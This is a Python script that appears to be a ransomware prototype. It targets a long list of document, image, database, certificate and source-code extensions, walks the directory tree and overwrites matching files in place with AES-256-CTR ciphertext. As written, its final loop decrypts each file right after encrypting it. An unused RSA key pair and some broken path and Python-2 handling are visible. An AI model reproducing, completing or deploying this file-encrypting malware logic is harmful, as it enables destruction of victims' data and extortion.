import os
import base64
import binascii


import Crypto.Cipher.AES
import Crypto.PublicKey.RSA
import Crypto.Cipher.PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto import Random
from Crypto.Cipher import AES
from Crypto.Util import Counter

filetypes = ['.pdf','.zip','.ppt','.doc','.docx','.rtf','.jpg','.jpeg','.png','.img','.gif','.mp3','.mp4','.mpeg',
	     '.mov','.avi','.wmv','.rtf','.txt','.html','.php','.js','.css','.odt', '.ods', '.odp', '.odm', '.odc',
             '.odb', '.doc', '.docx', '.docm', '.wps', '.xls', '.xlsx', '.xlsm', '.xlsb', '.xlk', '.ppt', '.pptx',
             '.pptm', '.mdb', '.accdb', '.pst', '.dwg', '.dxf', '.dxg', '.wpd', '.rtf', '.wb2', '.mdf', '.dbf',
             '.psd', '.pdd', '.pdf', '.eps', '.ai', '.indd', '.cdr', '.jpe', '.jpeg','.tmp','.log','.py',
             '.dng', '.3fr', '.arw', '.srf', '.sr2', '.bay', '.crw', '.cr2', '.dcr', '.rwl', '.rw2','.pyc',
             '.kdc', '.erf', '.mef', '.mrw', '.nef', '.nrw', '.orf', '.raf', '.raw',  '.r3d', '.ptx','.css',
             '.pef', '.srw', '.x3f', '.der', '.cer', '.crt', '.pem', '.pfx', '.p12', '.p7b', '.p7c','.html',
'.css','.js','.rb','.xml','.wmi','.sh','.asp','.aspx','.plist','.sql','.vbs','.ps1','.sqlite']

iv = Random.new().read(AES.block_size)
aes_key = os.urandom(32)


def aes_encrypt(plaintext, key):
    """
    AES-256-CTR Encryption
    """
    iv_int = int(binascii.hexlify(iv), 16)
    ctr = Counter.new(AES.block_size * 8, initial_value=iv_int)
    cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_CTR,counter=ctr)
    ciphertext = cipher.encrypt(plaintext)
    return base64.b64encode(ciphertext)



def aes_decrypt(ciphertext,key):
    """
    AES-256-CTR decryption
    """
    ciphertext = base64.b64decode(ciphertext)
    iv_int = int(iv.encode('hex'), 16)
    ctr = Counter.new(AES.block_size * 8, initial_value=iv_int)
    aes = AES.new(key, AES.MODE_CTR, counter=ctr)
    plaintext = aes.decrypt(ciphertext)
    return plaintext


def decrypt_file(filename, key):
    """
    """
    try:
        if os.path.isfile(filename):
            with open(filename, 'rb') as fp:
                ciphertext = fp.read()
            plaintext = aes_decrypt(ciphertext, key)
            with open(filename, 'wb') as fd:
                fd.write(plaintext)
            return True
        else:
            print("File not found" + filename)
    except Exception as e:
        print(e)
    return False


def encrypt_file(filename, rsa_key):
    """
    """
    try:
        if os.path.isfile(filename):
            if os.path.splitext(filename)[1] in globals()['filetypes']:
                    with open(filename, 'rb') as fp:
                        data = fp.read()
                    ciphertext = aes_encrypt(data, aes_key)
                    with open(filename, 'wb') as fd:
                        fd.write(ciphertext)
                    return True
        else:
            print("File not found" + filename)
    except Exception as e:
            print(e)
    return False


new_key = RSA.generate(2048, e=65537)
public_key = new_key.publickey().exportKey("PEM")
private_key = new_key.exportKey("PEM")

for root, dirs, files in os.walk(".", topdown=False):
    for file in files:
        encrypt_file(file,public_key)
        decrypt_file(file, aes_key)
